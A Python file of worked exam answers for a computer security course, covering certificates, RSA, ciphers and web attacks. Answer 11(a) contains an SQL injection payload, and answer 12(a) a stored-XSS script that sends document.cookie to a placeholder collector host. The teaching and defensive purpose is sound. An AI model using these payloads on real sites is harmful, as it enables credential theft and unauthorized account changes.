"""Worked answers in Markdown with canonical LaTeX math."""
answers = {}
answers['2018–19|1(a)'] = r'''
A digital certificate is a signed statement binding an identity/name to a public key. Typical contents include subject name (for a website, the permitted DNS names), subject public key and algorithm, issuer, serial number, validity interval, relevant usage/constraint extensions, signature algorithm and issuer signature.

**CA role.** A certification authority verifies an applicant’s control/identity according to the certificate type, then signs the binding. The browser already trusts selected root CA public keys and verifies a chain through any intermediate CAs to the site certificate.

![Certificate chain](assets/certificate-chain.svg)

The client must check chain signatures, permitted names/hostname, validity, CA constraints/key usages and applicable revocation information. A matching hostname cannot be inferred merely because some certificate signature verifies. Root self-signatures are not the original source of trust; preinstallation or deliberate configuration supplies that trust.

The certificate is public. The site proves possession of its corresponding private key during authenticated connection establishment. A CA does not need to carry or decrypt every later message and normally does not supply the site’s private key to visitors.

**Exam tip.** Draw root → intermediate → server and label which key verifies each signature. A certificate establishes an authenticated key binding, not guaranteed honesty of all content hosted by that site.
'''
answers['2018–19|1(d)'] = r'''
**A random-looking string may have important meaning.** Bob might unknowingly sign a digest of a harmful contract, an authorization token or a blinded representation whose meaning he has not reviewed. He should sign only through a defined, context-bound signing interface, not agree to apply a private-key operation to arbitrary supplied values.

**Concrete raw-RSA risk.** If Bob uses the same raw RSA key for decryption and signing, a ciphertext C looks random. An attacker who asks Bob to “sign” C obtains $C^d\bmod N$, which is exactly its decrypted plaintext. Even a restriction that blocks a particular C is ineffective if blind raw operations remain allowed: choose invertible r and ask for:

$$
\begin{aligned}X&=Cr^e\bmod N,\\Y&=X^d=C^dr\bmod N,\\Yr^{-1}&=C^d\bmod N.\end{aligned}
$$

This example depends on the **raw RSA operation and key reuse**. It is not an automatic attack against properly encoded RSA-PSS signatures on hashed messages. However, the broader semantic risk remains: Bob should know what byte sequence and protocol context he is authorizing.

Use separate keys for signing/encryption, proper secure signature encodings, application/domain separation, and a trusted display/workflow that accurately represents the signed content.

**Exam tip.** Explain both the semantic problem and, if using the algebraic example, its raw-RSA assumptions. “It looks random so it cannot be a contract” is the mistake.
'''
answers['2018–19|4(b)'] = r'''
**Phishing** lures a victim into trusting a fraudulent message/site. Example: an email asks the victim to log in at a lookalike bank domain, where the attacker collects credentials.

**Pharming** redirects a victim’s attempt to reach a legitimate service to an attacker-controlled destination, often through malicious DNS responses, poisoned resolver data, altered hosts configuration or a compromised router. The victim may type the correct hostname and still be directed to the wrong IP.

| Feature | Phishing | Pharming |
|---|---|---|
| Typical manipulation | Lure, domain appearance, service identity | Name resolution or routing/configuration |
| User may type the real address | Not required | Yes |
| Example | Fake login link | DNS poisoning sends bank hostname to attacker |
| Relevant defenses | Origin-bound authentication, careful origin handling | Protect DNS/router/hosts configuration; authenticated DNS where appropriate; proper TLS hostname/certificate validation |

Proper TLS validation can reveal that the redirected endpoint lacks a valid certificate for the real hostname; users must not bypass warnings. HTTPS on a lookalike phishing domain authenticates that lookalike name, not the bank. The attacks can be combined.

**Exam tip.** Identify the redirect mechanism in the pharming example. Neither technique requires guessing the victim’s password beforehand.
'''
answers['2018–19|5(a)'] = r'''
Use A=0,…,Z=25, column vectors and the **printed spelling DITECTIVE**, not an automatically corrected word. Split into DIT, ECT, IVE:

$$
\begin{gathered}K=\begin{pmatrix}3&0&2\\2&0&2\\0&1&1\end{pmatrix},\\[4pt]K\begin{pmatrix}3\\8\\19\end{pmatrix}\equiv\begin{pmatrix}21\\18\\1\end{pmatrix}\;(\mathrm{VSB}),\quad K\begin{pmatrix}4\\2\\19\end{pmatrix}\equiv\begin{pmatrix}24\\20\\21\end{pmatrix}\;(\mathrm{YUV}),\\[4pt]K\begin{pmatrix}8\\21\\4\end{pmatrix}\equiv\begin{pmatrix}6\\24\\25\end{pmatrix}\;(\mathrm{GYZ})\pmod{26}.\end{gathered}
$$

**Ciphertext: VSBYUVGYZ.** If a course explicitly uses row vectors instead, apply that convention consistently and state it; this solution follows the column-vector convention used in the supplied Hill material.

**Key issue:** det(K)=−2≡24 mod 26 and gcd(24,26)=2. Therefore this matrix is not invertible modulo 26. Encryption is still defined and produces the answer above, but the printed matrix is not a valid key for a uniquely decryptable standard Hill cipher. Do not silently change its entries to make it invertible.

**Exam tip.** Show block products so a convention difference is visible. Since the question asks only encryption, report that result and briefly flag the key defect.
'''
answers['2018–19|5(b)'] = r'''
**All subsequent plaintext blocks after P_i are generally garbled, unless the receiver restores the original bit alignment.** DES-CBC operates on fixed 64-bit ciphertext blocks. Inserting one zero bit after C_i shifts every later receiver block boundary by one bit. For example, with i=4:

```text
Original: ... | C4 | c5[1] ... c5[64] | c6[1] ...
Received: ... | C4 | 0 c5[1] ... c5[63] | c5[64] c6[1] ...
```

The receiver’s next block is not C5; every subsequent reconstructed block is a mixture of adjacent original blocks. CBC decryption $P_i=D_K(C_i)\oplus C_{i-1}$ therefore continues using the wrong blocks. P1 through P_i are unaffected; later plaintext is not reliably recovered.

**Different question:** if a bit is flipped rather than inserted, only its corresponding block is unpredictably corrupted and the matching bit in the next plaintext block flips; later blocks recover. A whole-block substitution also preserves framing. Those familiar CBC propagation rules do not apply to a one-bit insertion.

**Exam tip.** Underline “inserted.” CBC is self-recovering from some value errors with intact block boundaries, not from an uncorrected bit-position shift.
'''
answers['2018–19|6(a)'] = r'''
Trace wires from their endpoints; crossings without dots are **not junctions**. Label the top input/output wire 0 and proceed downward.

![Original P-box and S-box scan](assets/original-pboxes.png)

The pictured wiring maps input position i to output position π(i):

| Input i | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
|---|---:|---:|---:|---:|---:|---:|---:|---:|
| Output π(i) | 4 | 7 | 3 | 0 | 6 | 5 | 1 | 2 |

**(i) P-box.** Ask which input label arrives at each output, top to bottom. Invert the table:

```text
output positions: 0 1 2 3 4 5 6 7
input labels:     3 6 7 2 0 5 4 1
```

**Answer: 36720541.** These are labels of eight bit positions, not a binary number containing digits above 1.

**(ii) S-box.** The 3-to-8 decoder activates the wire corresponding to the input octal value. The wiring takes i to π(i), then the 8-to-3 encoder emits that output index. Assuming the standard top-to-bottom 0…7 decoder/encoder numbering, the substitution table is π itself:

```text
input:  7 6 5 4 3 2 1 0
output: 2 1 5 6 0 3 7 4
```

**Answer: 21560374.** The numbering convention matters because the decoder’s outputs are not explicitly numbered in the scan; reversing their ordering would change the numerical substitution.

**Exam tip.** P-box asks “which input ends up here?” whereas S-box asks “where does this active decoder wire go?” This is why inverse and forward permutation tables appear in the two parts.
'''
answers['2018–19|8(b)'] = r'''
The paper asks any three short notes; all four are supplied here.

**(i) Faraday cage.** A conducting enclosure attenuates electromagnetic fields across its boundary, helping isolate radio communications or reduce electromagnetic leakage. It can be used for shielding sensitive equipment or isolating wireless devices. Effectiveness depends on frequency, conductivity, seams, apertures and cables; an arbitrary metal box does not guarantee perfect shielding or erase stored data.

**(ii) Blind SQL injection.** Input changes SQL execution even though query results are not directly returned. An attacker infers a predicate from a page difference, an error/no-error outcome, or a controlled time delay. For example, two inputs differing only in a true/false predicate may produce consistently different responses. Prevent by binding values to prepared statements, limiting database privileges and avoiding unnecessary query/error exposure. Hiding results alone is not a fix.

**(iii) Impersonation token.** In operating-system security, a token represents an identity and associated permissions. A service may use a client’s impersonation token to perform an operation with that client’s authority rather than its own broader authority. Incorrect handling or theft can permit identity/privilege misuse. Distinguish this from a web session bearer token, whose copied value lets a requester be treated as its associated user; the precise course context should determine the intended meaning. In both cases, possession/delegation and scope matter.

**(iv) Homograph attack.** Visually similar characters in a domain or identifier create a deceptive resemblance to a trusted name. The browser’s origin/DNS string can differ while the user sees something familiar. An example is mixing Latin and visually similar Cyrillic letters. Origin-bound password managers/authenticators and careful display/identifier handling reduce the risk; a valid certificate for the lookalike domain does not certify equivalence to the real brand.

**Exam tip.** Each selected note is only 3 marks: definition, concrete mechanism/example and one limitation/defense are usually enough. The “impersonation token” terminology is not fully explained in the supplied notes, so the ambiguity is explicit rather than forced into a web-only definition.
'''
answers['2018–19|11(a)'] = r'''
The original PHP interpolates three fields into:

```sql
UPDATE employee SET password='NEW'
WHERE eid='EID' AND password='OLD'
```

Use these form values:

```text
EID:          EID100
Old Password: anything
New Password: you_are_hacked', salary=10 WHERE eid='EID100' -- 
```

The space after `--` is intentional. The resulting single statement is:

```sql
UPDATE employee
SET password='you_are_hacked', salary=10
WHERE eid='EID100' -- '
WHERE eid='EID100' AND password='anything'
```

The injected comma adds a second assignment, the injected WHERE targets EID100, and the comment removes the intended old-password predicate. The result sets the password to the requested string and salary to 10 (the question’s dollar amount). It assumes the shown MySQL/PHP string-interpolation behavior and that the database account has those update permissions.

**Exam tip.** A payload consisting only of `' OR 1=1` in the old-password field may bypass a check but does not itself add the required salary assignment. Show both requested effects in the resulting SQL.
'''
answers['2018–19|11(b)'] = r'''
A direct prepared-statement repair of the paper’s schema is:

```php
<?php
$eid = $_POST['EID'];
$oldpwd = $_POST['OldPassword'];
$newpwd = $_POST['NewPassword'];

// $conn is an existing mysqli connection.
$stmt = $conn->prepare(
    'UPDATE employee SET password = ? WHERE eid = ? AND password = ?'
);
$stmt->bind_param('sss', $newpwd, $eid, $oldpwd);
$stmt->execute();
$stmt->close();
?>
```

Bind values **after** preparing the fixed SQL. Question marks are placeholders, not quoted string fragments. The attempted `', salary=10 ...` is now stored/compared as data inside one value; it cannot add a column assignment or rewrite WHERE. PHP’s bind/execute interface is documented in [the mysqli prepared-statement manual](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php).

**Practical password-storage correction.** The snippet preserves the exam’s plaintext-password model solely to show the SQL-boundary repair. A proper implementation retrieves the authenticated employee’s stored password hash, verifies the submitted old password with `password_verify`, computes the new hash with `password_hash`, then performs `UPDATE employee SET password_hash=? WHERE eid=?` using bound values. Keep authenticated identity server-side, require CSRF protection and revoke affected sessions according to policy. Salary changes should use a separate authorized workflow.

**Exam tip.** Calling prepare on an already interpolated SQL string does not repair injection. The SQL structure must be fixed before untrusted values enter.
'''
answers['2018–19|12(a)'] = r'''
This is a **stored XSS** exercise: the guest-book Message is saved and later inserted into HTML without appropriate escaping. Each viewer runs the injected script as vulnerable.com, not as Sammy’s separate origin.

A representative payload for the deliberately vulnerable exam site is:

```html
<script>
// 1. Deface the trusted page.
const p = document.getElementById('p1');
if (p) p.textContent = 'This guest book has an XSS vulnerability.';

// 2. Make the viewer send a friend request to Sammy (id 40).
new Image().src = '/action/friend/add?id=40';

// 3. Demonstrate export of script-readable cookie data.
// collector.example is a placeholder, not a configured service.
fetch('https://collector.example/receive', {
  method: 'POST', mode: 'no-cors', body: document.cookie
});
</script>
```

The supplied friend-add example uses id=100 to explain the endpoint’s format. Change it to **40** to benefit Sammy, whose id the question provides. `p1` is the exact supplied DOM element identifier. The image-generated GET carries the viewer’s applicable cookies under the paper’s vulnerable behavior, making the action occur as that viewer.

The examples demonstrate three distinct consequences: integrity of displayed content, unauthorized authenticated actions, and confidentiality loss for data available to script. An attacker could also read accessible page data, alter forms or distribute a malicious lure. “All damages” cannot mean arbitrary OS file access: XSS remains subject to the browser sandbox and other controls.

**Limits and defenses.** HttpOnly prevents reading that cookie via document.cookie, but does not stop same-origin authenticated actions. CSP may block the inline script or export destination. Contextual escaping/sanitization of guest-book content is the root repair; avoid state-changing GETs, use CSRF protection, and apply CSP/cookie restrictions as additional controls. This payload assumes the vulnerable behavior stipulated by the exam rather than bypassing every modern defense.

**Exam tip.** Identify the victim as each visitor, not the attacker who submitted the entry, and use Sammy’s id rather than copying the endpoint’s example id unchanged.
'''
